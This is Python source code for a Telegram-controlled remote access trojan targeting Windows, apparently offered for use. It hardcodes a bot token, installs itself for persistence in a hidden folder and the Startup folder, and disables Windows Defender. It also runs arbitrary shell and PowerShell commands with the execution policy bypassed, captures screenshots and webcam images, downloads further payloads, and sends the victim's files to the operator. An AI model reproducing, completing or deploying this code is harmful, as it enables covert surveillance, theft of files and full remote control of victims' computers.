import telepot
import subprocess
import time
import getpass
import sys
import os
import shutil
import pyautogui
import tempfile
import platform
import psutil
import socket
import requests
import cv2  

# Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
bot = telepot.Bot('6429077143:AAGJS6IbZhWFaOdY1uWw6NVzc22zE6FsxQM')

# Replace 'YOUR_USER_ID' with your Telegram user ID
allowed_user_id = '5707089305'

connected_bots = {}
connected_clients = {}  # Initialize the connected_clients dictionary
static_client_name = 'myclient'

def run_powershell_script(script):
    try:
        command = f'powershell -ExecutionPolicy Bypass -Command "{script}"'
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return result
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"

def antiav(chat_id):
    script = r'''
    $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    $registryProperty = "DisableAntiSpyware"

    # Disable Windows Defender Antivirus
    Set-ItemProperty -Path $registryPath -Name $registryProperty -Value 1

    # Stop Windows Defender Antivirus Service
    Stop-Service -Name "WinDefend" -Force
    '''
    result = run_powershell_script(script)
    bot.sendMessage(chat_id, result)

def handle_dir_command(args, chat_id):
    if len(args) >= 2:
        target_directory = args[1]
        change_directory(target_directory, chat_id)
    else:
        bot.sendMessage(chat_id, 'Usage: /dir {directory_path}\nChange the current directory.')

def handle_run_command(args, chat_id):
    if len(args) >= 2:
        file_to_run = args[1]
        try:
            subprocess.Popen(file_to_run, shell=True)
        except Exception as e:
            bot.sendMessage(chat_id, f"Error executing the file: {str(e)}")
    else:
        bot.sendMessage(chat_id, 'Usage: /run {filename}\nExecute a file in the current directory.')


def execute_received_code(code, chat_id):
    try:
        ps_script_path = os.path.join(tempfile.gettempdir(), 'temp_script.ps1')
        
        with open(ps_script_path, 'w') as ps_script_file:
            ps_script_file.write(code)
        
        command = f'powershell -ExecutionPolicy Bypass -File "{ps_script_path}"'
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        
        if result:
            bot.sendMessage(chat_id, result)
        else:
            bot.sendMessage(chat_id, "Code executed successfully.")
        
        os.remove(ps_script_path)
    except Exception as e:
        bot.sendMessage(chat_id, f"Error executing received code: {str(e)}")

def download_file(url, destination):
    try:
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            filename = url.split('/')[-1]  # Get the filename from the URL
            full_path = os.path.join(destination, filename)
            
            with open(full_path, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    file.write(chunk)
            
            return full_path
        else:
            return None
    except Exception as e:
        return None

def change_directory(new_dir, chat_id):
    try:
        os.chdir(new_dir)
        bot.sendMessage(chat_id, f"Current directory changed to '{new_dir}'.")
    except Exception as e:
        bot.sendMessage(chat_id, f"Error changing directory: {str(e)}")
        
def handle_dir_command(args, chat_id):
    if str(chat_id) == allowed_user_id:
        if len(args) > 1:
            change_directory(args[1], chat_id)
        else:
            bot.sendMessage(chat_id, 'Usage: /dir {directory}\nChange the current directory.')
    else:
        bot.sendMessage(chat_id, 'Access denied.')

def list_files_in_directory(directory, chat_id):
    try:
        files = os.listdir(directory)
        file_list = "\n".join(files)
        bot.sendMessage(chat_id, f"Files in directory '{directory}':\n{file_list}")
    except Exception as e:
        bot.sendMessage(chat_id, f"Error listing files: {str(e)}")

def handle_download_command(filename, chat_id):
    try:
        if os.path.exists(filename):
            bot.sendDocument(chat_id, document=open(filename, 'rb'))
        else:
            bot.sendMessage(chat_id, f"File '{filename}' not found.")
    except Exception as e:
        bot.sendMessage(chat_id, f"Error sending file: {str(e)}")

def handle_upload_command(args, chat_id):
    if len(args) >= 4:
        website = args[1]
        destination_dir = args[2]
        filename = args[3]
        
        ps_command = (
            f'$client = new-object System.Net.WebClient;'
            f'$client.DownloadFile("{website}", "{destination_dir}\\{filename}");'
        )
        
        execute_received_code(ps_command, chat_id)
    else:
        bot.sendMessage(chat_id, 'Usage: /upload {website} {destination_dir} {filename}')


        
def copy_exe_to_directory(target_directory):
    script_name = os.path.basename(sys.argv[0])
    exe_path = sys.executable  # Get the path of the executable
    
    target_path = os.path.join(target_directory, script_name)
    
    if not os.path.exists(target_path):
        try:
            shutil.copy(exe_path, target_path)
            print(f"Executable copied to the specified directory: {target_path}")
        except Exception as e:
            print(f"Failed to copy executable to the specified directory: {str(e)}")
    else:
        print("Executable already exists in the specified directory.")
        
    return target_path

def add_to_startup(executable_path):
    username = getpass.getuser()
    startup_path = os.path.join('C:/Users', username, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    try:
        shutil.copy(executable_path, startup_path)
        print(f"Executable added to startup: {startup_path}")
    except Exception as e:
        print(f"Failed to add executable to startup: {str(e)}")

# Create a 'violex' directory in the user's home directory
user_home_directory = os.path.expanduser('~')
violex_directory = os.path.join(user_home_directory, 'violex')
os.makedirs(violex_directory, exist_ok=True)

# Copy the executable to the 'violex' directory
copied_exe_path = copy_exe_to_directory(violex_directory)

# Call the function to add the copied executable to startup
add_to_startup(copied_exe_path)

# The rest of your script...


def handle_help_command(chat_id):
    help_message = (
"Available commands:\n"
"/info - Get system information\n"
"/execute {command} - Execute a command\n"
"/runps {path_to_script.ps1} - Execute a PowerShell script\n"
"/drop - Receive a file\n"
"/screen - Capture and send a screenshot\n"
"/process - List third-party processes\n"
"/cam - Capture and send a camera image\n"
"/killprocess {PID} - Kill a process by PID\n"
"/ls - Lists file in the dir\n"
"/dir {DIR} - Changes the dir you are managing\n"
"/run {filename} - Runs file in the dir ur managing\n"
"/download {filename} - Downloads file from the current dir\n"
"/upload {link} {dir} {filename.exe/jpg/ect}\n"
"/antiav - Disables windows av\n"
"/help - Show available commands\n"
        # Add other commands as needed
    )
    bot.sendMessage(chat_id, help_message)

def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    
def capture_and_send_camera_image(chat_id):
    try:
        cap = cv2.VideoCapture(0)  # Open the camera
        ret, frame = cap.read()    # Capture a frame
        cap.release()              # Release the camera
        
        if ret:
            image_path = os.path.join(tempfile.gettempdir(), 'camera_image.jpg')
            cv2.imwrite(image_path, frame)  # Save the captured frame as an image
            bot.sendPhoto(chat_id, photo=open(image_path, 'rb'))
            os.remove(image_path)
        else:
            bot.sendMessage(chat_id, "Failed to capture camera image.")
    except Exception as e:
        bot.sendMessage(chat_id, f"Error capturing and sending camera image: {str(e)}")

def kill_process_by_pid(pid, chat_id):
    try:
        pid = int(pid)
        process = psutil.Process(pid)
        process_name = process.name()
        process.terminate()
        bot.sendMessage(chat_id, f"Process '{process_name}' with PID {pid} terminated.")
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, ValueError):
        bot.sendMessage(chat_id, f"Failed to terminate process with PID {pid}.")

def handle_killprocess_command(args, chat_id):
    if str(chat_id) == allowed_user_id:
        if len(args) > 0:
            pid = args[0]
            kill_process_by_pid(pid, chat_id)
        else:
            bot.sendMessage(chat_id, 'Usage: /killprocess {PID}\nTerminates a process by its PID.')
    else:
        bot.sendMessage(chat_id, 'Access denied.')
def get_third_party_processes():
    third_party_processes = []
    for proc in psutil.process_iter(attrs=['pid', 'name', 'username']):
        try:
            process_name = proc.info['name'].lower()
            username = proc.info['username']
            
            if platform.system().lower() == 'windows' and username != 'NT AUTHORITY\\SYSTEM':
                third_party_processes.append(f"PID: {proc.info['pid']}, Name: {process_name}")
            elif platform.system().lower() != 'windows':
                third_party_processes.append(f"PID: {proc.info['pid']}, Name: {process_name}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return third_party_processes

def list_third_party_processes(chat_id):
    third_party_processes = get_third_party_processes()
    if third_party_processes:
        max_message_length = 4000  # Maximum message length (adjust as needed)
        processes_message = "\n".join(third_party_processes)
        
        # Split the message into smaller parts
        message_parts = [processes_message[i:i + max_message_length] for i in range(0, len(processes_message), max_message_length)]
        
        for part in message_parts:
            bot.sendMessage(chat_id, part)
    else:
        bot.sendMessage(chat_id, "No third-party processes found.")

def capture_and_send_screenshot(chat_id):
    try:
        screenshot_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
        pyautogui.screenshot(screenshot_path)
        bot.sendPhoto(chat_id, photo=open(screenshot_path, 'rb'))
        os.remove(screenshot_path)
    except Exception as e:
        bot.sendMessage(chat_id, f"Error capturing and sending screenshot: {str(e)}")
def get_external_ip():
    try:
        response = requests.get('http://api.ipify.org?format=json', timeout=5)
        data = response.json()
        return data['ip']
    except requests.RequestException:
        return 'N/A'

def execute_command(command, chat_id):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        bot.sendMessage(chat_id, result)
    except subprocess.CalledProcessError as e:
        bot.sendMessage(chat_id, f"Error: {e.output}")

def execute_powershell_script(script_path, chat_id):
    if os.path.exists(script_path) and script_path.lower().endswith('.ps1'):
        command = f'powershell -ExecutionPolicy Bypass -File "{script_path}"'
        execute_command(command, chat_id)
    else:
        bot.sendMessage(chat_id, 'Invalid PowerShell script path.')

def get_system_info():
    os_info = platform.system()
    os_release = platform.release()
    os_arch = platform.architecture()[0]
    cpu_info = platform.processor()
    memory_info = psutil.virtual_memory()
    external_ip = get_external_ip()
    
    info_message = f"Operating System: {os_info} {os_release}\n"
    info_message += f"Architecture: {os_arch}\n"
    info_message += f"CPU: {cpu_info}\n"
    info_message += f"Available RAM: {memory_info.available / (1024 ** 3):.2f} GB\n"
    info_message += f"External IP Address: {external_ip}\n"
    
    return info_message

# Command handler for '/info'
def handle_info_command(chat_id):
    if str(chat_id) == allowed_user_id:
        info_message = get_system_info()
        bot.sendMessage(chat_id, info_message)
    else:
        bot.sendMessage(chat_id, 'Access denied.')

# Command handler for '/execute'
def handle_execute_command(args, chat_id):
    if str(chat_id) == allowed_user_id:
        execute_command(' '.join(args), chat_id)
    else:
        bot.sendMessage(chat_id, 'Access denied.')

# Command handler for '/runps'
def handle_runps_command(args, chat_id):
    if str(chat_id) == allowed_user_id:
        execute_powershell_script(args[0], chat_id)
    else:
        bot.sendMessage(chat_id, 'Access denied.')

# Command handler for '/drop'
def handle(msg):
    try:
        content_type, chat_type, chat_id = telepot.glance(msg)

        if content_type == 'text':
            command = msg['text']
            args = command.split()

            if args[0] == '/info':
                handle_info_command(chat_id)
            elif args[0] == '/execute':
                handle_execute_command(args[1:], chat_id)
            elif args[0] == '/runps':
                handle_runps_command(args[1:], chat_id)
            elif args[0] == '/drop':
                handle_drop_command(chat_id)
            elif args[0] == '/screen':
                capture_and_send_screenshot(chat_id)
            elif args[0] == '/process':
                list_third_party_processes(chat_id)
            elif args[0] == '/run':
                handle_run_command(args, chat_id)
            elif args[0] == '/cam':
                handle_cam_command(chat_id)
            elif args[0] == '/antiav':
                antiav(chat_id)
            elif args[0] == '/killprocess':
                handle_killprocess_command(args[1:], chat_id)
            elif args[0] == '/help':
                handle_help_command(chat_id)
            elif args[0] == '/dir':
                handle_dir_command(args, chat_id)
            elif args[0] == '/ls':
                list_files_in_directory(os.getcwd(), chat_id)
            elif args[0] == '/download':
                if len(args) > 1:
                    handle_download_command(args[1], chat_id)
                else:
                    bot.sendMessage(chat_id, 'Usage: /download {filename}\nDownload a file from the device.')
            elif args[0] == '/upload':
                handle_upload_command(args, chat_id)
            else:
                bot.sendMessage(chat_id, 'Unknown command. Type /help for a list of available commands.')
        else:
            bot.sendMessage(chat_id, 'Unknown content type.')
    except KeyError as e:
        print(f"KeyError: {e}")
        bot.sendMessage(chat_id, "An error occurred. Please try again later.")

# Start listening for commands
bot.message_loop(handle)

while True:
    # Clean up disconnected bots and handle other tasks
    for bot_id, bot_info in connected_bots.copy().items():
        last_seen = bot_info['last_seen']
        if time.time() - last_seen > 3600:  # Remove if inactive for 1 hour
            bot.sendMessage(bot_id, f"Bot {bot_id} is offline.")
            del connected_bots[bot_id]
    time.sleep(10)  # Adjust the interval as needed